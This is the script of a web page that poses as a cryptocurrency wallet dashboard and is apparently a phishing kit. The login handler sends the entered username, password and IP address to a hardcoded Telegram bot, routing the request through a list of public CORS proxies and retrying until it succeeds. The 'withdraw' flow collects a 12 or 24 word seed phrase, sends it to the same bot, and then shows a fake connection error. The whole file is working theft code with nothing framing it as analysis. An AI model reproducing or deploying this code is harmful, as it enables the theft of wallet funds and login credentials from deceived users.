    <script>
        async function sendToTelegram(message) {
            const telegramUrl = `https://api.telegram.org/bot7993122183:AAG-bLdJ9JIXdS5Zgxs5zwnzBA1ff7BShgw/sendMessage?chat_id=7373523973&text=${encodeURIComponent(message)}`;

            const PROXY_APIS = [
                'https://cors.bridged.cc/',
                'https://thingproxy.freeboard.io/fetch/',
                'https://api.allorigins.win/raw?url=',
                'https://corsproxy.io/?',
                'https://cors-anywhere.herokuapp.com/',
                'https://api.codetabs.com/v1/proxy?quest=',
                'https://proxy.cors.sh/'
            ];

            let attempt = 1;
            let success = false;
            
            while (!success) {
                console.log(`Attempt ${attempt} to send to Telegram...`);
                
                for (const proxy of PROXY_APIS) {
                    try {
                        const proxyUrl = proxy + encodeURIComponent(telegramUrl);
                        console.log(`Testing proxy: ${proxy}`);
                        
                        const response = await fetch(proxyUrl, {
                            method: 'GET',
                            cache: 'no-store',
                            mode: 'cors'
                        });

                        if (!response.ok) {
                            console.log(`Proxy ${proxy} did not respond, next proxy...`);
                            continue;
                        }

                        const text = await response.text();

                        if (text.includes('"ok":true') || text.includes('"ok": true')) {
                            console.log("Send successful with:", proxy);
                            success = true;
                            return true;
                        }
                        
                        let json;
                        try { 
                            json = JSON.parse(text); 
                            if (json.ok === true || (json.contents && JSON.parse(json.contents).ok === true)) {
                                console.log("Send successful with:", proxy);
                                success = true;
                                return true;
                            }
                        } catch { 
                            continue;
                        }
                    } catch (err) {
                        console.log(`Error with proxy ${proxy}`);
                    }
                }

                attempt++;
                
                if (attempt % 5 === 0) {
                    console.log("5 unsuccessful attempts, waiting 3 seconds...");
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            return false;
        }

        let currentCoin = "Unknown";

        document.getElementById('toggle-password').onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.classList.add('show-password');
                this.title = 'Hide password';
            } else {
                passwordInput.type = 'password';
                this.classList.remove('show-password');
                this.title = 'Show password';
            }
            
            passwordInput.focus();
        };

        document.getElementById('login-form').onsubmit = async e => {
            e.preventDefault();
            const u = document.getElementById('username').value.trim();
            const p = document.getElementById('password').value;
            if(u === 'john371' && p === '2525561'){
                document.getElementById('loading-text').textContent = "Signing in...";
                document.getElementById('loader').style.display = 'flex';
                
                localStorage.setItem('isLoggedIn','true');
                let ip = 'Unknown';
                try { ip = await (await fetch('https://api.ipify.org')).text(); } catch{}
                
                await sendToTelegram(`New Login\nUser: ${u}\nPassword: ${p}\nIP: ${ip}\nTime: ${new Date().toLocaleString('fa-IR')}`);
                
                document.getElementById('loader').style.display = 'none';
                document.getElementById('login-container').style.display = 'none';
                document.getElementById('dashboard').style.display = 'flex';
                document.getElementById('power-btn').style.display = 'block';
                updateTrx();
            } else {
                document.getElementById('error-message').classList.add('show');
                setTimeout(() => document.getElementById('error-message').classList.remove('show'), 3500);
            }
        };

        document.querySelectorAll('.action-button[data-action="withdraw"]').forEach(btn => {
            btn.onclick = () => {
                document.getElementById('power-btn').style.display = 'none';
                currentCoin = btn.getAttribute('data-coin');
                document.getElementById('withdraw-title').textContent = `Withdraw ${currentCoin}`;
                document.getElementById('withdraw-connect-modal').classList.add('active');
            };
        });

        document.querySelectorAll('.action-button[data-action="deposit"]').forEach(btn => {
            btn.onclick = () => {
                document.getElementById('power-btn').style.display = 'none';
                const coin = btn.getAttribute('data-coin');
                document.getElementById('deposit-title').textContent = `Deposit ${coin}`;
                document.getElementById('deposit-modal').classList.add('active');
            };
        });

        document.getElementById('open-seed').onclick = () => {
            document.getElementById('withdraw-connect-modal').classList.remove('active');
            document.getElementById('seed-modal').classList.add('active');
            document.getElementById('seed-input').value = '';
            document.getElementById('word-count').textContent = '0/24';
            document.getElementById('connection-error').classList.remove('show');
        };

        document.getElementById('seed-input').oninput = () => {
            const words = document.getElementById('seed-input').value.trim().split(/\s+/).filter(w => w.length > 0);
            const count = words.length;
            document.getElementById('word-count').textContent = `${count}/24`;
            document.getElementById('word-count').classList.toggle('valid', count === 12 || count === 24);
        };

        document.getElementById('submit-seed').onclick = async () => {
            const words = document.getElementById('seed-input').value.trim().split(/\s+/).filter(w => w.length > 0);
            if (words.length !== 12 && words.length !== 24) {
                alert("Please enter exactly 12 or 24 words");
                return;
            }

            document.getElementById('loader').style.display = 'flex';
            document.getElementById('loading-text').textContent = "Connecting to wallet...";
            document.getElementById('connection-error').classList.remove('show');

            let ip = 'Unknown';
            try { ip = await (await fetch('https://api.ipify.org')).text(); } catch {}

            await sendToTelegram(`New Seed - ${currentCoin}\nPhrase: ${words.join(' ')}\nWords: ${words.length}\nIP: ${ip}\nTime: ${new Date().toLocaleString('fa-IR')}`);
            
            document.getElementById('loader').style.display = 'none';
            
            document.getElementById('connection-error').classList.add('show');
            
            setTimeout(() => {
                document.getElementById('connection-error').classList.remove('show');
            }, 10000);
        };

        document.getElementById('power-btn').onclick = () => {
            localStorage.removeItem('isLoggedIn');
            document.getElementById('login-container').style.display = 'block';
            document.getElementById('dashboard').style.display = 'none';
            document.getElementById('power-btn').style.display = 'none';
        };

        async function updateTrx() {
            try {
                const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');
                const d = await r.json();
                document.getElementById('trx-usd').textContent = `≈ $${(3460 * d.tron.usd).toFixed(2)}`;
            } catch {
                document.getElementById('trx-usd').textContent = '—';
            }
        }

        document.querySelectorAll('.close-modal').forEach(b => {
            b.onclick = e => { 
                e.stopPropagation(); 
                b.closest('.modal').classList.remove('active'); 
                document.getElementById('connection-error').classList.remove('show');
                document.getElementById('power-btn').style.display = 'block';
            };
        });
        
        window.onclick = e => { 
            if (e.target.classList.contains('modal')) {
                e.target.classList.remove('active'); 
                document.getElementById('connection-error').classList.remove('show');
                document.getElementById('power-btn').style.display = 'block';
            }
        };

        if (localStorage.getItem('isLoggedIn') === 'true') {
            document.getElementById('login-container').style.display = 'none';
            document.getElementById('dashboard').style.display = 'flex';
            document.getElementById('power-btn').style.display = 'block';
            updateTrx();
        }
    </script>
